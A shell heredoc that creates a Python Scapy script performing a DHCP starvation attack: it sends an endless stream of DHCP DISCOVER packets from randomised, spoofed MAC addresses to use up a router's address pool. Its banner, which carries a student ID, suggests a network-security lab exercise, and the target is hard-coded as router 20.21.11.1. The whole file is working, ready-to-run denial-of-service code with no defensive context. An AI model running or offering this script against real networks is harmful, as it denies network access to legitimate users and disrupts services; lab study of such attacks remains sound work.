cat > 04_dhcp_starvation.py << 'EOF'
#!/usr/bin/env python3
import sys, time, random, signal
from scapy.all import Ether, IP, UDP, BOOTP, DHCP, sendp, conf

INTERFAZ = "eth0"
DELAY    = 0.01
enviados = 0
corriendo = True

def salir(sig, frame):
    print(f"\n[!] Detenido. DISCOVERs enviados: {enviados}")
    print("  Verifica en router: show ip dhcp binding")
    sys.exit(0)

def mac_aleatoria():
    primer = (random.randint(0,255) & 0xFE) | 0x02
    return "%02x:%02x:%02x:%02x:%02x:%02x" % (
        primer,
        random.randint(0,255), random.randint(0,255),
        random.randint(0,255), random.randint(0,255),
        random.randint(0,255))

def mac_a_bytes(mac):
    raw = bytes(int(x,16) for x in mac.split(":"))
    return raw + b"\x00" * (16 - len(raw))

def construir_discover(fake_mac):
    return (
        Ether(src=fake_mac, dst="ff:ff:ff:ff:ff:ff")
        / IP(src="0.0.0.0", dst="255.255.255.255")
        / UDP(sport=68, dport=67)
        / BOOTP(op=1, xid=random.randint(1,0xFFFFFFFF),
                flags=0x8000, chaddr=mac_a_bytes(fake_mac))
        / DHCP(options=[
            ("message-type", "discover"),
            ("hostname", f"PC-{random.randint(1000,9999)}"),
            ("param_req_list", [1,3,6,15,28]),
            "end"
        ])
    )

def main():
    global enviados
    signal.signal(signal.SIGINT, salir)
    conf.verb = 0

    print("=" * 50)
    print("  ATAQUE DHCP Starvation - Matricula 20211150")
    print("=" * 50)
    print(f"  Interfaz : {INTERFAZ}")
    print(f"  Target   : Router 20.21.11.1 (DHCP Server)")
    print("  Ctrl+C para detener\n")

    while corriendo:
        try:
            sendp(construir_discover(mac_aleatoria()),
                  iface=INTERFAZ, verbose=False)
            enviados += 1
            if enviados % 10 == 0:
                print(f"  [+] DISCOVERs enviados: {enviados}", end="\r")
        except Exception as e:
            print(f"\n[!] Error: {e}")
            break
        time.sleep(DELAY)

if __name__ == "__main__":
    main()
EOF
echo "Starvation ha sido creado"
